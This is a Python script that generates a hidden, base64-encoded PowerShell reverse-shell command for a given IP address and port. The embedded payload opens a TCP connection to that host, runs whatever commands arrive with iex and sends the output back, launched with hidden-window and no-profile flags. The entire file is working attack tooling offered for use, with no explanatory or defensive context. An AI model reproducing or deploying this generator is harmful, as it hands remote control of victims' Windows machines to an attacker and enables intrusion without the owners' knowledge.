#!/usr/bin/env python3
"""
make_payload.py

Usage:
  python make_payload.py 192.168.1.10 4444
  python make_payload.py 192.168.1.10:4444

Prints a PowerShell one-liner with the provided IP and port encoded for -EncodedCommand.
"""
import argparse
import ipaddress
import sys
import base64

def parse_addr_port(text):
    """Accept 'IP PORT' or 'IP:PORT' style input."""
    if ':' in text and ' ' not in text:
        ip_text, port_text = text.rsplit(':', 1)
    else:
        parts = text.split()
        if len(parts) == 2:
            ip_text, port_text = parts
        else:
            raise ValueError("Input must be either 'IP PORT' or 'IP:PORT' or two separate args.")
    # Validate IP
    ipaddress.ip_address(ip_text)  # will raise if invalid
    port = int(port_text)
    if not (1 <= port <= 65535):
        raise ValueError(f"Port out of range: {port}")
    return ip_text, port

def main():
    parser = argparse.ArgumentParser(description="Create a PowerShell reverse-TCP one-liner for a given IP and port.")
    parser.add_argument("addr", nargs='+', help="IP and port as 'IP PORT' or 'IP:PORT'")
    args = parser.parse_args()

    joined = " ".join(args.addr)
    try:
        ip, port = parse_addr_port(joined)
    except ValueError as e:
        print("Error:", e, file=sys.stderr)
        parser.print_usage(sys.stderr)
        sys.exit(2)

    # Note: escaped {{0}} so .format() doesn’t try to interpret PowerShell’s {0}
    payload = (
        r'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});'
        r'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
        r'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
        r'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
        r'$sendback = (iex $data 2>&1 | Out-String );'
        r'$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
        r'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
        r'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    ).format(ip=ip, port=port)

    # PowerShell expects UTF-16LE for -EncodedCommand
    encoded = base64.b64encode(payload.encode('utf-16le')).decode('ascii')
    cmd = f"powershell -nop -w hidden -e {encoded}"
    print(cmd)

if __name__ == "__main__":
    main()
